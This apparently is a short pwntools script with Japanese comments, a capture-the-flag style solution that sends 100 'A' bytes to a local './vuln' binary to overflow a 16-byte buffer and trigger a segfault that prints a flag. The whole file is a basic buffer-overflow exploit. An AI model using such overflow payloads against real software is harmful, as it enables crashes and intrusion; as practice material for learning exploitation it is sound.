from pwn import *

# ローカルのバイナリを起動（またはリモートの接続先を指定）
p = process('./vuln')

# 16バイトを超える十分な長さのデータ（例: 'A'を100個）を作成
payload = b'A' * 100

# プログラムの "Input: " というプロンプトを待ってからペイロードを送信
p.sendlineafter(b'Input: ', payload)

# セグフォルトが起きて出力されたフラグを受け取る
p.interactive()